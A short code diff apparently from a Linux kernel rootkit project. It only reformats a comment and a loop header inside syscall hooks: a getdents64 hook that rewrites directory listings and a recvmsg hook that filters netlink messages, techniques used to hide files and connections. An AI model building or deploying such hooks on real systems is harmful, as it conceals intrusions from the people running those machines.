@@ -100,7 +100,8 @@ asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
         offset += reclen;
     }
 
-    // Copy the modified new buffer back to the user-space buffer to replace the original buf
+    // Copy the modified new buffer back to the user-space buffer to replace the
+    // original buf
     if (copy_to_user(user_dir, newbuf, new_size)) {
         kfree(kbuf);
         kfree(newbuf);
@@ -208,8 +209,7 @@ asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs) {
     // Iterate through the netlink messages
     size_t out_len = 0;
     long remaining = ret;
-    for (struct nlmsghdr *nlh = (void *)in;
-         NLMSG_OK(nlh, remaining);
+    for (struct nlmsghdr *nlh = (void *)in; NLMSG_OK(nlh, remaining);
          nlh = NLMSG_NEXT(nlh, remaining)) {
         // Always copy DONE so processes know the dump ended
         if (nlh->nlmsg_type == NLMSG_DONE) {
